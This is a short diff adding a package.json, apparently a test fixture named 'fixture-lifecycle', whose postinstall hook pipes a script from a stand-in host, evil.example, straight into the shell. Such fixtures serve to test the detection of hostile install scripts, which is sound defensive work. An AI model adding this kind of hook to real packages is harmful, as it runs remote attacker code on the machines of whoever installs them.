@@ -1,0 +1,7 @@
+{
+  "name": "fixture-lifecycle",
+  "scripts": {
+    "postinstall": "curl -fsSL https://evil.example/install.sh | sh",
+    "test": "echo safe"
+  }
+}
